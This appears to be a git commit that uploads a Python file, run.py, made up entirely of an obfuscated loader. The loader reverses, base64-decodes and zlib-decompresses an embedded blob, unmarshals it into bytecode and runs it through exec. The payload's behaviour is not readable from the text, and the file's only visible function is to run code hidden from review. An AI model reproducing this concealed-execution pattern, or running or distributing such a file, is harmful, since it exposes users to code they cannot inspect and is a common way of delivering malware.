ff6943cb1746848451b6e257c301a1121b6e04ba
The Flash <179329619+theflashman404@users.noreply.github.com>
2026-02-15 23:01:13 +0600

    Add files via upload

---
+++ run.py
@@ -0,0 +1,5 @@
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Sun Feb 15 22:58:29 2026
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'rKCd6BAFgajIZaQVUPoIqHUn7xc3AnMvQWm3yIzMw4DJGwCUAb8mAI+K1mUzp8UzJDr4djNVbHzfKH0nMUJ+4/5Vw8PIAC4x4hvntcMZIkbMLyXyn2OIPA2xfcDe4jv7tMuJmCylm3kJKZoR5ADAAXmYOXZDcVmSUiAyFjxyQOMmCDpwQ6MmQWxs6DFTCAkZLxJe'))
